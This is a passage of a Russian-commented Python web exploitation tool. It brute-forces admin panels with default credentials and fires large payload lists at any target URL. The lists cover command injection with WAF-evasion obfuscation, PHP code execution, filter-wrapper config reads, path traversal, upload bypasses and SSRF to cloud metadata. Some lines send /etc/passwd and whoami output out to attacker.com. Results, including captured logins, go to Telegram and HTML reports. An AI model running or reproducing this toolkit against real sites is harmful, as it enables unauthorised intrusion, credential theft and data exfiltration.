            '/phpmyadmin1', '/phpmyadmin2', '/phpmyadmin3', '/phpmyadmin4',
            '/dbadmin', '/mysql', '/myadmin', '/phpmyadmina', '/sqlmanager',
            '/mysqlmanager', '/p/m/a', '/PMA', '/pma', '/db', '/db/phpmyadmin',
            '/db/phpMyAdmin', '/db/dbadmin', '/db/mysql', '/db/myadmin',
            '/db/phpmyadmina', '/db/sqlmanager', '/db/mysqlmanager'
        ]
        
        base_url = self.target_url.rstrip('/')
        exploited_pages = []
        
        # список стандартных учеток
        common_credentials = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('administrator', 'administrator'),
            ('root', 'root'),
            ('admin', 'admin123'),
            ('admin', 'qwerty'),
            ('admin', 'letmein'),
            ('admin', 'welcome'),
            ('admin', 'monkey')
        ]
        
        for path in admin_paths:
            try:
                url = urljoin(base_url, path)
                response = self.session.get(url, timeout=self.timeout)
                
                # Проверяем статус HTTP ответа
                if response.status_code == 404:
                    # Пропускаем страницы с ошибкой 404 (страница не найдена)
                    logger.info(f"Пропускаем {url}: получен статус 404 (страница не найдена)")
                    continue
                
                # Проверяем заголовок страницы
                page_title = self._extract_title(response.text)
                if any(keyword.lower() in page_title.lower() for keyword in ['404', 'not found', 'не найдена', 'error', 'ошибка']):
                    # Пропускаем страницы с заголовками ошибок
                    logger.info(f"Пропускаем {url}: заголовок указывает на ошибку: {page_title}")
                    continue
                
                # проверяем признаки админки
                if any(indicator in response.text.lower() for indicator in [
                    'admin', 'administrator', 'login', 'dashboard', 'control panel',
                    'welcome to the admin', 'admin login', 'administrator login'
                ]):
                    # пробуем стандартные учетки
                    for username, password in common_credentials:
                        try:
                            # ищем форму входа
                            soup = BeautifulSoup(response.text, 'html.parser')
                            login_form = soup.find('form')
                            
                            if login_form:
                                form_action = login_form.get('action', '')
                                form_method = login_form.get('method', 'post').lower()
                                form_url = urljoin(url, form_action)
                                
                                # ищем поля для логина и пароля
                                username_field = None
                                password_field = None
                                
                                for input_field in login_form.find_all('input'):
                                    field_name = input_field.get('name', '').lower()
                                    if any(keyword in field_name for keyword in ['user', 'login', 'email']):
                                        username_field = input_field.get('name')
                                    elif any(keyword in field_name for keyword in ['pass', 'pwd']):
                                        password_field = input_field.get('name')
                                
                                if username_field and password_field:
                                    # пробуем войти
                                    login_data = {
                                        username_field: username,
                                        password_field: password
                                    }
                                    
                                    if form_method == 'post':
                                        login_response = self.session.post(form_url, data=login_data, timeout=self.timeout)
                                    else:
                                        login_response = self.session.get(form_url, params=login_data, timeout=self.timeout)
                                    
                                    # проверяем успешность входа
                                    if any(indicator in login_response.text.lower() for indicator in [
                                        'welcome', 'dashboard', 'control panel', 'logout', 'sign out',
                                        'admin panel', 'administrator panel'
                                    ]):
                                        exploited_pages.append({
                                            'url': url,
                                            'credentials': {
                                                'username': username,
                                                'password': password
                                            },
                                            'status': 'success'
                                        })
                                        logger.info(f"успешный вход в админку {url} с учеткой {username}:{password}")
                                        break
                        except Exception as e:
                            logger.error(f"ошибка при попытке входа в {url}: {e}")
                    
                    if not any(page['url'] == url for page in exploited_pages):  # если не удалось войти и страница еще не добавлена
                        exploited_pages.append({
                            'url': url,
                            'status': 'found',
                            'title': page_title
                        })
                        logger.info(f"найдена админка: {url}")
            except Exception as e:
                logger.error(f"ошибка при проверке админки {url}: {e}")
        
        # Если есть найденные админки, добавляем результат в структурированном формате
        if exploited_pages:
            admin_result = {
                'pages': exploited_pages
            }
            logger.info(f"Найдено админ-панелей: {len(exploited_pages)}")
            return [admin_result]  # Возвращаем список с одним объектом admin_result
        
        return []  # Возвращаем пустой список, если админки не найдены

    def _extract_title(self, html_content):
        """вытаскиваем заголовок страницы"""
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            title = soup.title.string if soup.title else ''
            return title.strip() if title else ''
        except:
            return ''

    def run_exploits(self):
        """запускаем все эксплойты"""
        logger.info(f"начало эксплуатации для {self.target_url}")
        
        # эксплуатируем sql
        sql_data = self.exploit_sql_injection(self.target_url)
        if sql_data:
            self.results.extend(sql_data)
        
        # эксплуатируем xss
        xss_data = self.exploit_xss(self.target_url)
        if xss_data:
            self.results.extend(xss_data)
        
        # эксплуатируем rce
        rce_data = self.exploit_rce(self.target_url)
        if rce_data:
            self.results.extend(rce_data)
        
        # эксплуатируем админки
        admin_data = self.exploit_admin_pages()
        if admin_data:
            self.results.extend(admin_data)  # Добавляем результаты в правильном формате
        
        logger.info(f"эксплуатация завершена. найдено уязвимостей: {len(self.vulnerable_points)}")
        logger.info(f"успешно эксплуатировано: {len(self.results)}")
        return self.results

    def exploit_rce(self, url, params=None):
        """ищем и эксплуатируем удаленное выполнение кода"""
        rce_payloads = {
            'os_command': [
                ';id', '|id', '`id`', '$(id)',
                ';ls -la', '|ls -la', '`ls -la`', '$(ls -la)',
                ';cat /etc/passwd', '|cat /etc/passwd', '`cat /etc/passwd`', '$(cat /etc/passwd)',
                ';uname -a', '|uname -a', '`uname -a`', '$(uname -a)',
                ';ps aux', '|ps aux', '`ps aux`', '$(ps aux)',
                # Добавляем Windows команды
                ';dir', '|dir', '`dir`', '$(dir)',
                ';whoami', '|whoami', '`whoami`', '$(whoami)',
                ';systeminfo', '|systeminfo', '`systeminfo`', '$(systeminfo)',
                ';net user', '|net user', '`net user`', '$(net user)',
                # Добавляем обфусцированные команды для обхода WAF
                '$(c${IFS}a${IFS}t${IFS}/etc/passwd)',
                '`c${IFS}a${IFS}t${IFS}/etc/passwd`',
                ';c${IFS}a${IFS}t${IFS}/etc/passwd',
                '|c${IFS}a${IFS}t${IFS}/etc/passwd',
                '%0Aid',  # URL encoded newline + command
                '%26%26id',  # URL encoded && + command
                '||id',  # logical OR + command
                ';${PATH:0:1}id',  # bash parameter expansion
                ';$(tr "!-~" "P-~!-O" <<< "vq")', # obfuscated 'id' command
                ";bash${IFS}-c${IFS}'id'",
                ";python${IFS}-c${IFS}'import${IFS}os;os.system(\"id\")'",
                # Network based data exfiltration
                '`ping -c 3 attacker.com`',
                ';ping -c 3 attacker.com',
                '|nslookup `whoami`.attacker.com',
                '$(wget -O- http://attacker.com/$(cat /etc/passwd | base64))',
                '$(curl http://attacker.com/$(whoami))'
            ],
            'php_code': [
                '<?php echo "RCE_TEST"; ?>',
                '<?php echo file_get_contents("/etc/passwd"); ?>',
                '<?php echo shell_exec("id"); ?>',
                '<?php echo system("ls -la"); ?>',
                '<?php echo phpinfo(); ?>',
                # Добавляем новые PHP-specific payloads
                '<?php passthru("id"); ?>',
                '<?php exec("id", $output); print_r($output); ?>',
                '<?=`id`;?>',  # Короткий тег
                '<script language="php">echo `id`;</script>',
                '<?php $_GET[cmd]?system($_GET[cmd]):passthru($_GET[cmd]); ?>',
                '<?php highlight_file(__FILE__); ?>',  # Для отображения исходного кода
                '<?php include($_GET["file"]); ?>',  # LFI/RFI через include
                '<?php preg_replace("/.*/e","system(\'id\')",""); ?>',  # preg_replace с модификатором e (eval)
                '<?php $a=str_rot13(\'flfgrz\'); $a(\'id\'); ?>',  # Обфускация через str_rot13
                '<?php $a=$_SERVER["HTTP_USER_AGENT"]; system($a); ?>'  # Команда из User-Agent
            ],
            'filter_wrappers': [
                'php://filter/convert.base64-encode/resource=../config/database.php',
                'php://filter/convert.base64-encode/resource=../wp-config.php',
                'php://filter/convert.base64-encode/resource=../config.php',
                'php://filter/convert.base64-encode/resource=../configuration.php',
                'php://filter/convert.base64-encode/resource=../includes/config.php',
                # Добавляем новые filter payloads
                'php://filter/read=convert.base64-encode/resource=../index.php',
                'php://filter/read=string.rot13/resource=../config.php',
                'php://filter/convert.iconv.utf-8.utf-16/resource=../config.php',
                'php://filter/convert.base64-encode|convert.base64-decode/resource=../config.php',
                'php://filter/zlib.deflate|convert.base64-encode/resource=../config.php',
                'data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==',  # data wrapper с base64 encoded PHP
                'php://input', # вместе с POST body содержащим PHP код
                'expect://id',  # expect wrapper для выполнения команд
                'zip://shell.jpg%23shell.php',  # zip wrapper для чтения архивов
                'phar://shell.phar/test.txt'  # phar wrapper
            ],
            'path_traversal': [
                '../../../etc/passwd',
                '../../../etc/hosts',
                '../../../var/www/html/index.php',
                '../../../var/www/html/config.php',
                '../../../var/www/html/wp-config.php',
                '../../../proc/self/environ',
                # Добавляем новые path traversal payloads
                '..%2f..%2f..%2fetc%2fpasswd',  # URL encoded
                '....//....//....//etc/passwd',  # Bypassing protection mechanisms
                '../../../windows/win.ini',  # Windows specific
                '../../../windows/system32/drivers/etc/hosts',  # Windows hosts file
                '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\\windows\\win.ini', # Extreme Windows path traversal
                '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',  # Double URL encoded
                '../../../../../../../../../../../../etc/passwd%00',  # Null byte termination (old PHP)
                '/%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd',  # Backslash encoding
                '/..;/..;/..;/..;/..;/..;/etc/passwd',  # Path parameter truncation
                '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'  # Overlong UTF-8 encoding
            ],
            'file_upload_exploits': [
                '<FileUpload>.php', # Для проверки простого расширения
                '<FileUpload>.PhP', # Проверка регистра
                '<FileUpload>.php.jpg', # Двойное расширение
                '<FileUpload>.php;.jpg', # Точка с запятой
                '<FileUpload>.php%00.jpg', # Null byte injection (старые версии PHP)
                '<FileUpload>.phtml', # Альтернативные PHP расширения
                '<FileUpload>.php5',
                '<FileUpload>.phar',
                '<FileUpload>.php.xxx',
                '<FileUpload>.xxx.php',
                '<FileUpload>.php_', # С подчеркиванием
                '<FileUpload>.php.', # С точкой в конце
                '<FileUpload>.php:', # Двоеточие
                '<FileUpload>.asp', # Другие исполняемые расширения
                '<FileUpload>.aspx',
                '<FileUpload>.jsp',
                '<FileUpload>.cgi',
                '<FileUpload>.pl'
            ],
            'ssrf_exploits': [
                'http://127.0.0.1:22', # SSH
                'http://127.0.0.1:3306', # MySQL
                'http://localhost:6379', # Redis
                'http://localhost:11211', # Memcached
                'http://localhost:5432', # PostgreSQL
                'http://[::]:80/', # IPv6 localhost
                'http://[0:0:0:0:0:ffff:127.0.0.1]', # IPv6 mapped IPv4
                'file:///etc/passwd', # Локальные файлы
                'dict://localhost:6379/info', # Redis через dict protocol
                'gopher://localhost:6379/_GET%20key', # Redis через gopher
                'http://169.254.169.254/latest/meta-data/', # AWS metadata
                'http://metadata.google.internal/', # GCP metadata
                'http://127.0.0.1:5000/private_api',
                'ftp://user:pass@internal-server',
                'http://10.0.0.0/8',  # Private network ranges
                'http://172.16.0.0/12',
                'http://192.168.0.0/16'
            ]
        }
        
        # специальные параметры для проверки на RCE
        sensitive_params = ['cmd', 'exec', 'command', 'shell', 'run', 'system', 'eval', 'code', 'file', 'path', 
                           'include', 'page', 'url', 'dir', 'action', 'board', 'date', 'download', 'path', 
                           'folder', 'prefix', 'style', 'lang', 'view', 'template', 'theme', 'module', 'func',
                           'arg', 'option', 'load', 'process', 'php', 'init', 'var', 'function', 'config', 'tmp',
                           'temp', 'debug', 'content', 'filename', 'target']
        
        exploited_data = []
        
        def test_payload(payload, field_name, form_url, method, payload_type):
            try:
                # Сначала получаем обычный ответ для сравнения
                if method == 'post':
                    normal_response = self.session.post(form_url, data={field_name: "normal_value"}, timeout=self.timeout)
                else:
                    normal_response = self.session.get(form_url, params={field_name: "normal_value"}, timeout=self.timeout)
                
                # Затем отправляем payload
                if method == 'post':
                    response = self.session.post(form_url, data={field_name: payload}, timeout=self.timeout)
                else:
                    response = self.session.get(form_url, params={field_name: payload}, timeout=self.timeout)
                
                # Проверяем различные паттерны в зависимости от типа payload
                # Используем глобальную переменную COMMAND_PATTERNS
                match_found = False
                extracted_data = ""
                
                # Дополнительная проверка на аномалии в ответе
                response_anomaly = False
                
                # 1. Проверка существенного изменения в размере ответа
                if abs(len(response.text) - len(normal_response.text)) > 500:
                    response_anomaly = True
                
                # 2. Проверка на изменение кода ответа
                if response.status_code != normal_response.status_code:
                    response_anomaly = True
                
                # 3. Проверка на существенные изменения в структуре ответа (например, в HTML)
                # с использованием метрики Левенштейна для частей документа
                def structural_similarity(text1, text2):
                    # Упрощенная функция для определения структурной схожести
                    # Мы используем только первые и последние 100 символов для скорости
                    prefix1 = text1[:100] if len(text1) > 100 else text1
                    prefix2 = text2[:100] if len(text2) > 100 else text2
                    suffix1 = text1[-100:] if len(text1) > 100 else text1
                    suffix2 = text2[-100:] if len(text2) > 100 else text2
                    
                    # Если обе части значительно отличаются, вероятно, структура изменилась
                    if prefix1 != prefix2 and suffix1 != suffix2:
                        return False
                    return True
                
                if not structural_similarity(response.text, normal_response.text):
                    response_anomaly = True
                
                for pattern in COMMAND_PATTERNS.get(payload_type, []):
                    match = re.search(pattern, response.text, re.MULTILINE)
                    if match:
                        # Проверяем, что результат не присутствует в обычном ответе
                        # (чтобы избежать ложных срабатываний)
                        if match.group(0) not in normal_response.text:
                            match_found = True
                            
                            # Извлекаем данные из ответа
                            if payload_type == 'filter_wrappers' and re.match(r'^[A-Za-z0-9+/=]+$', match.group(0)):
                                try:
                                    # Пытаемся декодировать base64
                                    decoded_content = base64.b64decode(match.group(0)).decode('utf-8', errors='ignore')
                                    
                                    # Проверяем, есть ли конфиденциальные данные в декодированном контенте
                                    # Ищем ключевые слова, связанные с конфиденциальной информацией
                                    creds_match = re.search(r'(password|pass|passwd|pwd|user|username|login|secret|key|token)[\'"]?\s*[=>:]\s*[\'"]([^\'"]+)[\'"]', decoded_content, re.IGNORECASE)
                                    if creds_match:
                                        extracted_data = f"{creds_match.group(1)}: {creds_match.group(2)}"
                                    else:
                                        # Проверяем, содержит ли декодированный контент PHP-код
                                        if re.search(r'<\?php|define\(|function\s+\w+\s*\(|class\s+\w+', decoded_content):
                                            # Берем только первые 200 символов для вывода
                                            extracted_data = decoded_content[:200] + ('...' if len(decoded_content) > 200 else '')
                                        else:
                                            # Если нет четких признаков PHP-кода, это может быть ложное срабатывание
                                            match_found = False
                                            continue
                                except:
                                    extracted_data = "Base64 encoded content detected (decode failed)"
                            else:
                                # Обрезаем длинные вывода до разумных размеров
                                extracted_data = match.group(0)[:200] + ('...' if len(match.group(0)) > 200 else '')
                                
                                # Дополнительная проверка для command injection
                                # Если это команда ОС, проверяем, что выдача соответствует ожидаемой
                                if payload_type == 'os_command':
                                    # Проверка на соответствие выполняемой команды и ее вывода
                                    if 'id' in payload and not re.search(r'uid=\d+.*gid=\d+', extracted_data):
                                        match_found = False
                                        continue
                                    elif 'ls' in payload and not re.search(r'total\s+\d+|[-d][-rwx]{9}', extracted_data):
                                        match_found = False
                                        continue
                                    elif 'passwd' in payload and not re.search(r'root:.*:0:0:', extracted_data):
                                        match_found = False
                                        continue
                                    elif 'uname' in payload and not re.search(r'Linux|Darwin|FreeBSD|Windows', extracted_data):
                                        match_found = False
                                        continue
                                    elif 'ps' in payload and not re.search(r'PID|USER|TIME|COMMAND', extracted_data):
                                        match_found = False
                                        continue
                                    elif 'whoami' in payload and not re.search(r'\w+', extracted_data):
                                        match_found = False
                                        continue
                                    elif 'dir' in payload and not re.search(r'Directory|Volume|File|Файл|Объем', extracted_data, re.IGNORECASE):
                                        match_found = False
                                        continue
                                    
                                    # Сравниваем содержимое ответа со списком ожидаемых слов в выводе команды
                                    command_name = re.search(r'[;|`$]\s*(\w+)', payload)
                                    if command_name:
                                        cmd = command_name.group(1)
                                        command_output_keywords = {
                                            'id': ['uid', 'gid', 'groups'],
                                            'ls': ['total', 'drwx', '-rw-'],
                                            'cat': ['root:', 'bin', 'daemon', 'sys'],
                                            'uname': ['Linux', 'Darwin', 'FreeBSD', 'Windows', 'GNU'],
                                            'ps': ['PID', 'CPU', 'MEM', 'COMMAND'],
                                            'whoami': ['root', 'www-data', 'admin', 'user', 'SYSTEM', 'Administrator'],
                                            'dir': ['Directory', 'Volume', 'File', 'Файл', 'Объем', 'bytes']
                                        }
                                        
                                        if cmd in command_output_keywords:
                                            keywords = command_output_keywords[cmd]
                                            if not any(keyword.lower() in extracted_data.lower() for keyword in keywords):
                                                match_found = False
                                                continue
                            
                            if match_found:
                                # Добавляем информацию о конкретной команде в извлеченные данные
                                if payload_type == 'os_command':
                                    command_info = f"[Команда: {payload}] "
                                    extracted_data = command_info + extracted_data
                                
                                exploited_data.append({
                                    'type': 'RCE_EXPLOITED',
                                    'url': form_url,
                                    'method': method,
                                    'field': field_name,
                                    'payload': payload,
                                    'payload_type': payload_type,
                                    'extracted_data': extracted_data
                                })
                                logger.info(f"найдена уязвимость RCE в {form_url} (поле: {field_name}, тип: {payload_type})")
                                return True
                
                # Если соответствия не найдены в шаблонах, но обнаружены аномалии в ответе
                # и тип payload подразумевает измененный ответ (например, SSRF)
                if response_anomaly and payload_type in ['ssrf_exploits', 'file_upload_exploits']:
                    # Проверяем признаки успешной эксплуатации
                    
                    # Для SSRF: поиск специфических признаков сервисов
                    if payload_type == 'ssrf_exploits':
                        ssrf_indicators = [
                            'SSH-\d\.\d', # SSH banner
                            'redis_version', # Redis info
                            '<title>Index of /', # Directory listing
                            'MySQL server', # MySQL banner
                            'PostgreSQL', # PostgreSQL info
                            'Instance Metadata Service', # Cloud metadata
                            'computeMetadata', # GCP metadata
                            '<\?xml', # XML response
                            'FTP server ready', # FTP banner
                            '220.*?FTP', # FTP banner alternative
                            'HTTP/\d\.\d\s+\d{3}' # HTTP response inside response
                        ]
                        
                        if any(re.search(pattern, response.text) for pattern in ssrf_indicators):
                            exploited_data.append({
                                'type': 'RCE_EXPLOITED',
                                'url': form_url,
                                'method': method,
                                'field': field_name,
                                'payload': payload,
                                'payload_type': 'SSRF',
                                'extracted_data': f"SSRF уязвимость обнаружена - доступ к внутреннему сервису: {payload}"
                            })
                            return True
                    
                    # Для File Upload: проверка на признаки успешной загрузки
                    elif payload_type == 'file_upload_exploits':
                        upload_success_indicators = [
                            'upload.*?success', 
                            'file.*?uploaded',
                            'success.*?upload',
                            'загрузка.*?успешно',
                            'успешно.*?загружен',
                            'uploaded.*?successfully',
                            'successfully.*?uploaded'
                        ]
                        
                        if any(re.search(pattern, response.text, re.IGNORECASE) for pattern in upload_success_indicators):
                            exploited_data.append({
                                'type': 'RCE_EXPLOITED',
                                'url': form_url,
                                'method': method,
                                'field': field_name,
                                'payload': payload,
                                'payload_type': 'FILE_UPLOAD',
                                'extracted_data': f"Опасный файл загружен успешно: {payload}"
                            })
                            return True
                
                return False
            except Exception as e:
                logger.error(f"ошибка при тестировании RCE payload: {e}")
            return False

def split_message(message, max_length=3800):
    """Разделяет длинное сообщение на части для отправки в Telegram"""
    if len(message) <= max_length:
        return [message]
    
    parts = []
    # Ищем хорошие места для разделения (после \n\n)
    lines = message.split('\n\n')
    current_part = ""
    
    for line in lines:
        # Если текущая часть + новая строка не превышает лимит
        if len(current_part) + len(line) + 2 <= max_length:
            if current_part:
                current_part += '\n\n' + line
            else:
                current_part = line
        else:
            # Если текущая часть не пуста, добавляем ее в список
            if current_part:
                parts.append(current_part)
            
            # Если строка сама по себе слишком длинная, разбиваем ее
            if len(line) > max_length:
                # Разделяем на части по max_length символов
                for i in range(0, len(line), max_length):
                    parts.append(line[i:i+max_length])
                current_part = ""
            else:
                current_part = line
    
    # Добавляем последнюю часть, если она не пуста
    if current_part:
        parts.append(current_part)
    
    # Добавляем нумерацию частей
    for i in range(len(parts)):
        if i == 0:
            parts[i] = f"🔍 <b>ДЕТАЛЬНЫЙ ОТЧЕТ ОБ ЭКСПЛУАТАЦИИ УЯЗВИМОСТЕЙ (часть {i+1}/{len(parts)}):</b>\n\n" + parts[i]
        else:
            parts[i] = f"🔍 <b>ДЕТАЛЬНЫЙ ОТЧЕТ (продолжение, часть {i+1}/{len(parts)}):</b>\n\n" + parts[i]
    
    return parts

def format_results_for_telegram(results):
    """форматируем результаты для телеги"""
    if not results:
        return ["🔍 <b>Результаты сканирования:</b>\n\nУязвимостей не обнаружено. Цель кажется защищенной от проверенных векторов атаки."]
    
    message = "🔍 <b>ДЕТАЛЬНЫЙ ОТЧЕТ ОБ ЭКСПЛУАТАЦИИ УЯЗВИМОСТЕЙ:</b>\n\n"
    
    # Счетчики для статистики
    sql_count = 0
    xss_count = 0
    rce_count = 0
    admin_count = 0
    ssrf_count = 0
    upload_count = 0
    
    # Функция для безопасного экранирования HTML в сообщениях
    def escape_html(text):
        if not text:
            return ""
        return text.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
    
    # Группируем по типам уязвимостей
    for result in results:
        # Проверяем, что это словарь и имеет ключ 'type'
        if not isinstance(result, dict):
            continue
            
        # Обрабатываем элементы, у которых есть ключ 'type'
        if 'type' in result:
            if result['type'] == 'SQL_INJECTION_DATA':
                sql_count += 1
                message += f"🔴 <b>ЭКСПЛУАТАЦИЯ SQL-ИНЪЕКЦИИ #{sql_count}</b>\n"
                message += f"⚡️ <b>URL точки внедрения:</b> {result['url']}\n"
                message += f"⚡️ <b>Метод запроса:</b> {result['method'].upper()}\n"
                message += f"⚡️ <b>Уязвимый параметр:</b> <code>{result['field']}</code>\n"
                message += f"⚡️ <b>Использованный payload:</b>\n<code>{escape_html(result['payload'])}</code>\n"
                message += f"⚡️ <b>Извлеченные данные:</b>\n<code>{escape_html(result['extracted_data'])}</code>\n"
                message += f"⚡️ <b>Метод эксплуатации:</b> Внедрение SQL-кода для извлечения данных из БД через UNION-based или error-based инъекцию\n"
                message += f"⚡️ <b>Рекомендации:</b> Использовать подготовленные выражения, параметризованные запросы и правильную валидацию входных данных\n\n"
            
            elif result['type'] == 'XSS_EXPLOITED':
                xss_count += 1
                message += f"🔴 <b>ЭКСПЛУАТАЦИЯ CROSS-SITE SCRIPTING (XSS) #{xss_count}</b>\n"
                message += f"⚡️ <b>URL точки внедрения:</b> {result['url']}\n"
                message += f"⚡️ <b>Метод запроса:</b> {result['method'].upper()}\n"
                message += f"⚡️ <b>Уязвимый параметр:</b> <code>{result['field']}</code>\n"
                
                # Добавляем тип XSS, если указан
                if 'xss_type' in result:
                    message += f"⚡️ <b>Тип XSS:</b> {result['xss_type']}\n"
                
                message += f"⚡️ <b>Использованный payload:</b>\n<code>{escape_html(result['payload'])}</code>\n"
                
                # Добавляем оригинальный payload, если указан
                if 'original_payload' in result and result['original_payload'] != result['payload']:
                    message += f"⚡️ <b>Оригинальный payload:</b>\n<code>{escape_html(result['original_payload'])}</code>\n"
                
                message += f"⚡️ <b>Идентификатор трекинга:</b> {result['tracking_id']}\n"
                message += f"⚡️ <b>Метод эксплуатации:</b> Внедрение JavaScript-кода, который может красть cookies и передавать их на сервер атакующего\n"
                message += f"⚡️ <b>Рекомендации:</b> Использовать HTML-экранирование, CSP-заголовки и проверку входных данных\n\n"
            
            elif result['type'] == 'RCE_EXPLOITED':
                rce_count += 1
                message += f"🔴 <b>ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #{rce_count}</b>\n"
                message += f"⚡️ <b>URL точки внедрения:</b> {result['url']}\n"
                message += f"⚡️ <b>Метод запроса:</b> {result['method'].upper()}\n"
                message += f"⚡️ <b>Уязвимый параметр:</b> <code>{result['field']}</code>\n"
                message += f"⚡️ <b>Использованный payload:</b>\n<code>{escape_html(result['payload'])}</code>\n"
                
                # Определяем тип RCE эксплуатации
                payload_type = result.get('payload_type', 'неизвестный')
                
                # Если это SSRF, увеличиваем счетчик SSRF
                if payload_type.upper() == 'SSRF':
                    ssrf_count += 1
                
                # Если это File Upload, увеличиваем счетчик File Upload
                if payload_type.upper() == 'FILE_UPLOAD':
                    upload_count += 1
                
                message += f"⚡️ <b>Тип эксплуатации:</b> {payload_type}\n"
                
                # Добавляем более подробное описание типа RCE
                rce_type_desc = ""
                if payload_type == 'os_command':
                    rce_type_desc = "Внедрение системных команд ОС"
                elif payload_type == 'php_code':
                    rce_type_desc = "Выполнение PHP кода"
                elif payload_type == 'filter_wrappers':
                    rce_type_desc = "Использование PHP filter wrapper для чтения исходного кода"
                elif payload_type == 'path_traversal':
                    rce_type_desc = "Выход за пределы корневой директории (path traversal)"
                elif payload_type == 'file_upload_exploits' or payload_type == 'FILE_UPLOAD':
                    rce_type_desc = "Загрузка вредоносного файла"
                elif payload_type == 'include':
                    rce_type_desc = "Включение произвольного файла (LFI/RFI)"
                elif payload_type == 'ssrf_exploits' or payload_type == 'SSRF':
                    rce_type_desc = "Подделка межсайтовых запросов (SSRF)"
                
                message += f"⚡️ <b>Техника эксплуатации:</b> {rce_type_desc}\n"
                message += f"⚡️ <b>Результат выполнения:</b>\n<code>{escape_html(result['extracted_data'])}</code>\n"
                message += f"⚡️ <b>Рекомендации:</b> Избегать использования функций exec/eval, проверять имена файлов, использовать белые списки\n\n"
        
        # Обрабатываем элементы для админ-страниц
        elif 'pages' in result and isinstance(result['pages'], list):
            admin_count = len(result['pages'])
            message += f"🔴 <b>ОБНАРУЖЕНЫ АДМИНИСТРАТИВНЫЕ ИНТЕРФЕЙСЫ ({admin_count})</b>\n\n"
            
            successful_logins = 0
            for page in result['pages']:
                if page['status'] == 'success':
                    successful_logins += 1
            
            if successful_logins > 0:
                message += f"⚠️ <b>КРИТИЧЕСКАЯ УЯЗВИМОСТЬ: {successful_logins} административных интерфейсов взломаны</b>\n\n"
            
            for i, page in enumerate(result['pages'], 1):
                message += f"🔹 <b>Админ-панель #{i}</b>\n"
                message += f"⚡️ <b>URL:</b> {page['url']}\n"
                
                if page['status'] == 'success':
                    message += f"⚡️ <b>Статус:</b> <code>ВЗЛОМАНА</code> ⚠️\n"
                    message += f"⚡️ <b>Учетные данные:</b> <code>{page['credentials']['username']}:{page['credentials']['password']}</code>\n"
                    message += f"⚡️ <b>Метод эксплуатации:</b> Подбор стандартных/слабых паролей\n"
                else:
                    message += f"⚡️ <b>Статус:</b> Обнаружена (доступ не получен)\n"
                    if 'title' in page:
                        message += f"⚡️ <b>Заголовок страницы:</b> {escape_html(page['title'])}\n"
                
                message += f"⚡️ <b>Рекомендации:</b> Использовать сложные пароли, двухфакторную аутентификацию и ограничение доступа по IP\n\n"
    
    # Добавляем общую статистику
    total_vulnerabilities = sql_count + xss_count + rce_count + admin_count
    message += f"📊 <b>СТАТИСТИКА УЯЗВИМОСТЕЙ:</b>\n"
    message += f"🔸 Всего уязвимостей: {total_vulnerabilities}\n"
    if sql_count > 0:
        message += f"🔸 SQL-инъекции: {sql_count}\n"
    if xss_count > 0:
        message += f"🔸 XSS-уязвимости: {xss_count}\n"
    if rce_count > 0:
        message += f"🔸 RCE-уязвимости: {rce_count}\n"
        if ssrf_count > 0:
            message += f"  └ SSRF-уязвимости: {ssrf_count}\n"
        if upload_count > 0:
            message += f"  └ File Upload уязвимости: {upload_count}\n"
    if admin_count > 0:
        message += f"🔸 Админ-панели: {admin_count}\n"
    
    # Добавляем временную метку
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    message += f"\n⏱ <b>Отчет сгенерирован:</b> {current_time}"
    
    # Разделяем сообщение на части, если оно слишком длинное
    return split_message(message)

def format_results_for_html(results):
    """Форматируем результаты в виде HTML-отчета"""
    if not results:
        return """
        <!DOCTYPE html>
        <html lang="ru">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Отчет о сканировании уязвимостей</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 0; padding: 20px; color: #333; line-height: 1.6; }
                .container { max-width: 1000px; margin: 0 auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
                h1 { color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px; }
                .result-box { background: #f9f9f9; border-left: 4px solid #2ecc71; padding: 15px; margin: 15px 0; border-radius: 4px; }
                .no-vuln { border-left: 4px solid #2ecc71; }
                .footer { margin-top: 30px; font-size: 0.8em; color: #7f8c8d; text-align: center; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Отчет о сканировании уязвимостей</h1>
                <div class="result-box no-vuln">
                    <h3>🔍 Результаты сканирования</h3>
                    <p>Уязвимостей не обнаружено. Цель кажется защищенной от проверенных векторов атаки.</p>
                </div>
                <div class="footer">
                    <p>Отчет сгенерирован: """ + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + """</p>
                </div>
            </div>
        </body>
        </html>
        """
    
    # Функция для безопасного экранирования HTML в отчете
    def escape_html(text):
        if not text:
            return ""
        return text.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
    
    # Счетчики для статистики
    sql_count = 0
    xss_count = 0
    rce_count = 0
    admin_count = 0
    ssrf_count = 0
    upload_count = 0
    
    # HTML-начало отчета
    html = """
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Отчет об эксплуатации уязвимостей</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 0; padding: 20px; color: #333; line-height: 1.6; }
            .container { max-width: 1000px; margin: 0 auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
            h1 { color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px; }
            h2 { color: #2c3e50; margin-top: 30px; }
            h3 { color: #2c3e50; }
            .vulnerability { background: #f9f9f9; border-left: 4px solid #e74c3c; padding: 15px; margin: 15px 0; border-radius: 4px; }
            .vuln-details { margin-left: 20px; }
            .payload { background: #ecf0f1; padding: 10px; border-radius: 4px; font-family: monospace; overflow-x: auto; }
